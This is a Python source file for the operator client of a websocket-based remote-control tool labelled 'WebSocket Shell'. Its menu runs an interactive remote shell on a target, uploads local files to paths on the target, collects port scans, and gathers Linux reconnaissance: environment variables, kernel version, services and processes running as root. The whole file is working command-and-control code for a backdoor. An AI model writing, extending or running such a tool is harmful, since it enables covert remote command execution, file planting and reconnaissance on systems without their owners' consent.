#coding:utf-8
"""
@author='九世 '
@time='2018/12/25'
"""
import websockets
import time
import asyncio
import json

banner="""
'##:::::'##:'########:'########:::'######:::'#######:::'######::'##:::'##:
 ##:'##: ##: ##.....:: ##.... ##:'##... ##:'##.... ##:'##... ##: ##::'##::
 ##: ##: ##: ##::::::: ##:::: ##: ##:::..:: ##:::: ##: ##:::..:: ##:'##:::
 ##: ##: ##: ######::: ########::. ######:: ##:::: ##: ##::::::: #####::::
 ##: ##: ##: ##...:::: ##.... ##::..... ##: ##:::: ##: ##::::::: ##. ##:::
 ##: ##: ##: ##::::::: ##:::: ##:'##::: ##: ##:::: ##: ##::: ##: ##:. ##::
. ###. ###:: ########: ########::. ######::. #######::. ######:: ##::. ##:
:...::...:::........::........::::......::::.......::::......:::..::::..::
'########:'########::'######::'##::::'##:'########:'##:::::::'##:::::::
 ##.....::... ##..::'##... ##: ##:::: ##: ##.....:: ##::::::: ##:::::::
 ##:::::::::: ##:::: ##:::..:: ##:::: ##: ##::::::: ##::::::: ##:::::::
 ######:::::: ##::::. ######:: #########: ######::: ##::::::: ##:::::::
 ##...::::::: ##:::::..... ##: ##.... ##: ##...:::: ##::::::: ##:::::::
 ##:::::::::: ##::::'##::: ##: ##:::: ##: ##::::::: ##::::::: ##:::::::
 ########:::: ##::::. ######:: ##:::: ##: ########: ########: ########:
........:::::..::::::......:::..:::::..::........::........::........::
"""

md={}
up={}


async def client(uri):
        async with websockets.connect(uri) as websocket:
            print('[+] {}'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            print(banner)
            while True:
                meter=input('pyt:')
                if meter=="shell":
                    await websocket.send("shell")
                    while True:
                        user=input('cmd>')
                        if user=="back":
                            md['cmd']="back"
                            values=json.dumps(md)
                            await websocket.send(values)
                            break
                        elif user!="back":
                            md['cmd']=user
                            mds=json.dumps(md)
                            await websocket.send(mds)
                            duqu=await websocket.recv()
                            vds=json.loads(duqu)
                            print(vds['jg'])

                elif meter=="upload":
                    await websocket.send("upload")
                    bd_path=input('Local_path>')
                    target_path=input('Target_path>')
                    dk=open(bd_path,'rb')
                    up['local_path']=bd_path
                    up['value']=bytes.decode(dk.read())
                    up['target_path']=target_path
                    jk=json.dumps(up)
                    await websocket.send(jk)
                    ksw=await websocket.recv()
                    print(ksw)

                elif meter=="portscan":
                    await websocket.send("portscan")
                    while True:
                        js=await websocket.recv()
                        jss=json.loads(js)
                        print(jss['openport'])
                        if jss['ids']==jss['jgs']:
                            break


                elif meter=="Lcollection":
                    await websocket.send("Lcollection")
                    os_version=await websocket.recv()
                    os_versions=json.loads(os_version)
                    print('[+] os_version:')
                    print(os_versions['os_version'])
                    print('')
                    kernel_version=await websocket.recv()
                    kernel_versions=json.loads(kernel_version)
                    print('[+] kernel_version:')
                    print(kernel_versions['kernel_version'])
                    print('')
                    environmental_variable=await websocket.recv()
                    environmental_variabless=json.loads(environmental_variable)
                    print('[+] environmental_variables:')
                    print(environmental_variabless['environmental_variable'])
                    print('')
                    printer=await websocket.recv()
                    printers=json.loads(printer)
                    print('[+]printer')
                    print(printers['printer'])
                    print('')
                    operating_services=await websocket.recv()
                    operating_service=json.loads(operating_services)
                    print('[+] operating_services:')
                    print(operating_service['operating_services'])
                    print('')
                    processes_with_root_privileges=await websocket.recv()
                    processes_with_root_privilege=json.loads(processes_with_root_privileges)
                    print('[+] processes_with_root_privileges:')
                    print(processes_with_root_privilege['processes_with_root_privileges'])
                    print('')
                    installed_version_and_running_status=await websocket.recv()
                    installed_version_and_running_statu=json.loads(installed_version_and_running_status)
                    print('[+] installed_version_and_running_status:')
                    print(installed_version_and_running_statu['installed_version_and_running_status'])
                    print('')

                elif meter=="help":
                    print('')
                    print('help:')
                    print('portscan    Effect:sacn open port')
                    print('upload      Effect:file upload')
                    print('shell       Effect:Interactive shells')
                    print('Lcollection Eiffect:Linux Information Collection')



if __name__ == '__main__':
    loop=asyncio.get_event_loop()
    loop.run_until_complete(client('ws://127.0.0.1:8887'))